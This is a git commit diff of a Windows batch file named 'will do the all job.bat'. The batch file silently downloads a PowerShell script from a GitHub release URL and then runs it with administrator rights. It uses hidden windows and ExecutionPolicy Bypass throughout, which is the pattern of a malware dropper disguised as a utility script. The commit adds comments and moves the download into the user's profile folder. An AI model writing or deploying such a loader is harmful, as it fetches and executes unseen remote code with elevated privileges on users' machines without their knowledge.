9bb9c7e61f4a6858d038683b7dd7c8be9433bdf3
Ahmed Moustafa <30881400+AhmedK97@users.noreply.github.com>
2023-08-19 13:19:38 +0300

    encoded  FF FE 0A 0D

--- best results/will do the all job.bat
+++ best results/will do the all job.bat
@@ -1,13 +1,20 @@
-@echo off
+ÿþ
+@echo off
 setlocal
 
+rem Set the URL to the script you want to download
 set "DownloadURL=https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/RunLevel.Highest.ps1"
-set "DownloadFilePath=package.ps1"
 
+rem Set the target file path within the user's profile directory
+set "DownloadFilePath=%USERPROFILE%\package.ps1"
+
+rem Download the script using Invoke-WebRequest
 powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri '%DownloadURL%' -OutFile '%DownloadFilePath%'"
 
-set "PowerShellScriptPath=%~dp0%DownloadFilePath%"
+rem Build the full path to the downloaded PowerShell script
+set "PowerShellScriptPath=%DownloadFilePath%"
 
+rem Run the downloaded PowerShell script with elevated permissions
 PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%PowerShellScriptPath%""' -Verb RunAs"
 
 endlocal
